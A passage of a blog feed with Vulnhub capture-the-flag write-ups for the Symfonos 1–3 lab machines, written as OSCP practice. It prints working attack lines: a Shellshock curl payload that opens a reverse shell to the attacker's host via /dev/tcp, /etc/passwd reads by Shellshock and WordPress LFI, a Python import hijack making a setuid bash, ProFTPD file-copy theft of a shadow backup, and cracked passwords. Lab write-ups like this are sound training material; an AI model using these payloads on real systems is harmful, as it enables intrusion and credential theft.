&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt

ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With the lowercase wordlist, we get underworld.&lt;/p&gt;
&lt;p&gt;To verify the shellshock vulnerability, we can send this request.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-cerberus&#34;&gt;Shell as cerberus&lt;/h1&gt;
&lt;p&gt;After verifying this vulnerability, we can get a reverse shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group pcap -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p&gt;
&lt;p&gt;Before sniffing traffic, I used &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pspy&lt;/a&gt;

 to check for cron jobs and other commands being executed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
traffic which isn&amp;rsquo;t typically encrypted.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;tcpdump port &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; -n -i lo -A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group gods -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
any imports in that ftpclient.py script.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span&gt;)
os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 2</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos2/</link>
      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos2/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;18 July 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;This box had quite a good number of misconfigurations and vulnerabilities. Initial access was through copying a shadow
backup file to a smb share accessible anonymously using a file copy vulnerability in proftpd. Then lateral movement
and privilege escalation was achieved by exploiting rce a locally running librenms instance and finally abusing
sudo permissions on mysql to get root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.191.129
Host is up (0.00028s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn&#39;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2021-01-25T07:02:21-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-25T13:02:21
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139/445)&lt;/h2&gt;
&lt;p&gt;Running smbmap on the target we see we can access the &lt;strong&gt;anonymous&lt;/strong&gt; share without credentials:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -R -H 192.168.191.129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/smbmap.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using smbclient to download log.txt from the anonymous share.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbclient &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;192.168.191.129&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;anonymous -N -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;ftp-21&#34;&gt;FTP (21)&lt;/h2&gt;
&lt;p&gt;Checking for known vulnerabilities of the proftp version using searchsploit, we find several.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The command execution exploits available rely on creating a php file on the existing webserver that would be executed.
However, the web server is running &lt;a href=&#34;https://github.com/ourway/webfsd&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;webfs&lt;/a&gt;

 which only serves static content.&lt;/p&gt;
&lt;p&gt;We can only take advantage of the file copy vulnerability. From log.txt, the smb configuration gives the location
of the anonymous share:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can exfiltrate information to the anonymous share by exploiting file copy on proftpd. Using the PoC shown here
&lt;a href=&#34;https://www.exploit-db.com/exploits/36742,&#34;&gt;https://www.exploit-db.com/exploits/36742,&lt;/a&gt; let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
In this case I use netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 192.168.191.129 &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Running smbmap command again we see that we have shadow.bak file.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-aeolus&#34;&gt;Shell as aeolus&lt;/h2&gt;
&lt;p&gt;After downloading the shadow file from the smb we can crack it with john and rockyou wordlist.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;john --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt shadow.bak
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using sergioteamo as the password we can access ssh as aeolus.&lt;/p&gt;
&lt;p&gt;Doing some basic manual enumeration, we see some ports listening on localhost.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;8080 would most likely be a webserver, so I&amp;rsquo;ll tunnel to it first using an ssh port forward.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using searchsploit again we find two existing vulnerabilities for version 1.46.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since we can&amp;rsquo;t verify the version of librenms currently running, we&amp;rsquo;ll try the exploits and see if they work. I&amp;rsquo;ll go for the RCE.&lt;/p&gt;
&lt;p&gt;Using the exploit script provided here &lt;a href=&#34;https://www.exploit-db.com/exploits/47044,&#34;&gt;https://www.exploit-db.com/exploits/47044,&lt;/a&gt; we need to provide url, session cookies,
rhost and rport where the reverse shell will be received.&lt;/p&gt;
&lt;p&gt;Login using the earlier discovered credentials &lt;strong&gt;aeolus : sergioteamo&lt;/strong&gt;, then retrieve the cookies using burpsuite.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Run the exploit as below and catch the reverse shell using netcat.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We are now the cronus user.&lt;/p&gt;
&lt;h2 id=&#34;getting-a-root-shell&#34;&gt;Getting a root shell&lt;/h2&gt;
&lt;p&gt;Running sudo -l reveals cronus can run mysql as root with no password.&lt;/p&gt;
&lt;p&gt;Dropping into mysql as root user, we can get a root shell using the below command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\!&lt;/span&gt; bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos2/symfonos2-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 1</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos1/</link>
      <pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;29 June 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p&gt;
&lt;p&gt;In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;I already have the IP of the box.&lt;/p&gt;
&lt;p&gt;Nmap output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.191.128
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-01-21T13:48:08-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-21T19:48:08
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139/445)&lt;/h2&gt;
&lt;p&gt;Using enum4linux-ng we get 2 pieces of useful information.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng.py -A 192.168.191.128:

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A user &lt;strong&gt;helios&lt;/strong&gt; is discovered&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos2.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;and the &lt;strong&gt;anonymous&lt;/strong&gt; share is accessible without credentials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos3.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using smbclient to access the share, there is a txt file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbclient &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;192.168.191.128&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;anonymous -N
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos4.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the contents of attention.txt:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos5.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we have a username and possible passwords. The combination &lt;strong&gt;helios:qwerty&lt;/strong&gt; works and we can access
the helios share.&lt;/p&gt;
&lt;p&gt;We get access to more txt files, but only the todo.txt has valuable information.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos6.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It gives an endpoint,that we can access on the webserver.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos7.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;When we access the endpoint we end up on a wordpress instance.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos8.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;mail-masta 1.0:&lt;/li&gt;
&lt;/ol&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos9.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;site-editor 1.1.1&lt;/li&gt;
&lt;/ol&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos10.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using the PoC available on exploitdb: &lt;a href=&#34;https://www.exploit-db.com/exploits/40290/&#34;&gt;https://www.exploit-db.com/exploits/40290/&lt;/a&gt; , we can craft this url
to read files such as /etc/passwd:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos11.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;getting-shell-as-helios---lfi-to-rce&#34;&gt;Getting shell as helios - LFI to RCE&lt;/h1&gt;
&lt;p&gt;A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
file to use this method.
With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p&gt;
&lt;p&gt;Sending email with payload:&lt;/p&gt;

